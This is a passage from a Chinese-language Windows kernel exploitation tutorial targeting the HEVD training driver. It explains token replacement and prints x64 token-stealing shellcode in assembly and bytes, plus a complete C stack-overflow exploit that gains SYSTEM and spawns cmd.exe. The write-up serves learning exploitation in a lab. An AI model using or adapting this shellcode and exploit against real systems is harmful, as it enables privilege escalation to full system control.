     20 0x000000014 SeDebugPrivilege                  Attributes - Enabled Default 
     21 0x000000015 SeAuditPrivilege                  Attributes - Enabled Default 
     22 0x000000016 SeSystemEnvironmentPrivilege      Attributes - 
     23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default 
     25 0x000000019 SeUndockPrivilege                 Attributes - 
     28 0x00000001c SeManageVolumePrivilege           Attributes - 
     29 0x00000001d SeImpersonatePrivilege            Attributes - Enabled Default 
     30 0x00000001e SeCreateGlobalPrivilege           Attributes - Enabled Default 
     31 0x00000001f SeTrustedCredManAccessPrivilege   Attributes - 
     32 0x000000020 SeRelabelPrivilege                Attributes - 
     33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - Enabled Default 
     34 0x000000022 SeTimeZonePrivilege               Attributes - Enabled Default 
     35 0x000000023 SeCreateSymbolicLinkPrivilege     Attributes - Enabled Default 
    Authentication ID:         (0,3e7)
    Impersonation Level:       Anonymous
    TokenType:                 Primary
    Source: *SYSTEM*           TokenFlags: 0x2000 ( Token in use )
    Token ID: 3ea              ParentToken ID: 0
    Modified ID:               (0, 3eb)
    RestrictedSidCount: 0      RestrictedSids: 0x0000000000000000
    OriginatingLogonSession: 0
对比一下`system`的token，可以发现，成功替换了。
至此，终于可以解释为什么`cmd.exe`没有提权成功了，因为我们提权的是`BufferOverflowStack.exe`进程，老的`cmd.exe`不是`BufferOverflowStack.exe`启动，所以它不继承`BufferOverflowStack.exe`的`system`权限，只有`BufferOverflowStack.exe`拉起来的进程才具有真正的`system`权限。如果你的新`cmd.exe`不是`BufferOverflowStack.exe`拉起来的，那必然也就会产生我上面的困扰，而且特别不容易发现其中的原因
## x64
在栈溢出上，`64`位和`32`位差别不大，首先通过`poc`确定栈溢出的长度，之后利用适用于`64`位的`exp`即可
添加注释版本`shellcode`
    ; Start of Token Stealing Stub
    xor rax, rax                         ; get ZERO
    mov rax, QWORD PTR gs:[rax + 0x188]  ; get nt!_KPCR.PcrbData.CurrentThread
                                            ; _KTHREAD is located at GS : [0x188]
    mov rax, [rax + 0x70]                ; get nt!_KTHREAD.ApcState.Process
    mov rcx, rax                        ; Copy current process _EPROCESS structure
    mov rdx,  4                         ; WIN 7 SP1 SYSTEM process PID = 0x4
    SearchSystemPID:
    mov rax, [rax + 0x188]               ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
    sub rax, 0x188
    cmp [rax + 0x180], rdx               ; Get nt!_EPROCESS.UniqueProcessId
    jne SearchSystemPID
    mov rdx, [rax + 208h]               ; Get SYSTEM process nt!_EPROCESS.Token
    mov [rcx + 208h], rdx               ; Replace target process nt!_EPROCESS.Token
                                        ; with SYSTEM process nt!_EPROCESS.Token
去除注释版本，方便转化
    xor rax, rax
    mov rax, QWORD PTR gs:[rax + 0x188]
    mov rax, [rax + 0x70]
    mov rcx, rax 
    mov rdx, 4
    SearchSystemPID:
    mov rax, [rax + 0x188]
    sub rax, 0x188
    cmp [rax + 0x180], rdx
    jne SearchSystemPID
    mov rdx, [rax + 0x208]
    mov [rcx + 0x208], rdx
    add rsp, 0x28
    ret
最终`exp`的源码
    #define _CRT_SECURE_NO_WARNINGS
    #include 
    #include 
    #define handle_error(msg, error_code) \
        do  \
        {                             \
            printf("%s with error code: %d\n", msg, error_code); \
        } while (0);
    void poc_x64()
    {
        do {
            HANDLE hDevice;
            // 2-bit unsigned integer. This is a flag field that indicates various access modes 
            // to use for creating and opening the file. 
            // This value SHOULD be set to 0xC0000000, meaning generic read and generic write
            hDevice = CreateFileA(
                /* LPCSTR lpFileName */ "\\\\.\\HackSysExtremeVulnerableDriver",
                /* DWORD dwDesiredAccess */ 0xC0000000,
                /* DWORD dwShareMode */ FILE_SHARE_READ | FILE_SHARE_WRITE,
                /* LPSECURITY_ATTRIBUTES lpSecurityAttributes */ NULL,
                /* DWORD dwCreationDisposition */ OPEN_EXISTING,
                /* DWORD dwFlagsAndAttributes */ 0,
                /* HANDLE hTemplateFile */ NULL);
            if (hDevice == INVALID_HANDLE_VALUE)
            {
                handle_error("Open device failed!\n", GetLastError());
                break;
            }
            DWORD dwReturnedBytes = 0;
            UCHAR szInBuffer[] = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2C";
            if (!DeviceIoControl(hDevice, 0x222003, szInBuffer, sizeof(szInBuffer), NULL, 0, &dwReturnedBytes, NULL))
            {
                handle_error("DeviceIoControl failed!\n", GetLastError());
                break;
            }
            else
            {
                printf("DeviceIoControl successfully.\n");
            }
        } while (0);
    }
    void exp_x64()
    {
        do {
            HANDLE hDevice;
            hDevice = CreateFileA(
                /* LPCSTR lpFileName */ "\\\\.\\HackSysExtremeVulnerableDriver",
                /* DWORD dwDesiredAccess */ 0xC0000000,
                /* DWORD dwShareMode */ FILE_SHARE_READ | FILE_SHARE_WRITE,
                /* LPSECURITY_ATTRIBUTES lpSecurityAttributes */ NULL,
                /* DWORD dwCreationDisposition */ OPEN_EXISTING,
                /* DWORD dwFlagsAndAttributes */ 0,
                /* HANDLE hTemplateFile */ NULL);
            if (hDevice == INVALID_HANDLE_VALUE)
            {
                handle_error("Open device failed!\n", GetLastError());
                break;
            }
            UCHAR ulShellcode[] = { 0x48, 0x31, 0xC0, 0x65, 0x48, 0x8B, 0x80, 0x88, 0x01, 
                                    0x00, 0x00, 0x48, 0x8B, 0x40, 0x70, 0x48, 0x89, 0xC1, 
                                    0x48, 0xC7, 0xC2, 0x04, 0x00, 0x00, 0x00, 0x48, 0x8B, 
                                    0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x2D, 0x88, 0x01, 
                                    0x00, 0x00, 0x48, 0x39, 0x90, 0x80, 0x01, 0x00, 0x00, 
                                    0x75, 0xEA, 0x48, 0x8B, 0x90, 0x08, 0x02, 0x00, 0x00, 
                                    0x48, 0x89, 0x91, 0x08, 0x02, 0x00, 0x00, 0x48, 0x83, 
                                    0xC4, 0x28, 0xC3 };
            PVOID pEopPayload = VirtualAlloc(NULL, sizeof(ulShellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (pEopPayload == NULL)
            {
                handle_error("VirtualAlloc", GetLastError());
                break;
            }
            RtlCopyMemory(pEopPayload, ulShellcode, sizeof(ulShellcode));
            DWORD dwInBufferSize = 2072 + 8;
            UCHAR* pInBuffer = (UCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwInBufferSize * sizeof(UCHAR));
            if (pInBuffer == NULL)
            {
                handle_error("HeapAlloc", GetLastError());
                break;
            }
            RtlFillMemory(pInBuffer, 2072, 0x41); // x64 
            PVOID pShellcode = &pEopPayload;
            PVOID *ppShellcode = &pEopPayload;
            RtlCopyMemory(pInBuffer + 2072, ppShellcode, 8);
            DWORD dwReturnedBytes = 0;
            if (!DeviceIoControl(hDevice, 0x222003, (LPVOID)pInBuffer, dwInBufferSize, NULL, 0, &dwReturnedBytes, NULL))
            {
                handle_error("DeviceIoControl failed!\n", GetLastError());
                break;
            }
            else
            {
                printf("DeviceIoControl successfully.\n");
                system("cmd.exe");
            }
            if (pInBuffer != NULL)
                HeapFree(GetProcessHeap(), 0, pInBuffer);
            if (pEopPayload != NULL)
                VirtualFree(pEopPayload, sizeof(ulShellcode), MEM_RELEASE);
        } while (0);
    }
    int main()
    {
        exp_x64();
        return 0;
    }
需要注意的就是`shellcode`中各个结构体在`x64`位中的位置变化，如果不对的话，就需要不断一步一步调试`shellcode`，看到底那一行汇编出问题了。这个过程只是比较繁琐，并不难。
## 结论
内核调试的难点在于繁琐，可能机器需要不停的重启，重启之后需要重新设置环境，启动服务，重新设置断点。需要比调试`ring3`程序更耐心。如果觉得环境被破坏了，重启即可。
这部分`exp`
的编写主要的难点在于`shellcode`，在实验过程中，建议不要直接使用`hevd`提供的利用代码，可以尝试自己写，最多可以用一个`shellcode`，这样的话收获要比直接用要多很多。
## 参考链接
[Windows Kernel Exploitation Tutorial Part 2: Stack
Overflow](https://rootkits.xyz/blog/2017/08/kernel-stack-overflow/)
[HEVD Exploits – Windows 7 x86-64 Stack
Overflow](https://h0mbre.github.io/HEVD_Stackoverflow_64bit/)
[Online x86 / x64 Assembler and
Disassembler](https://defuse.ca/online-x86-assembler.htm#disassembly)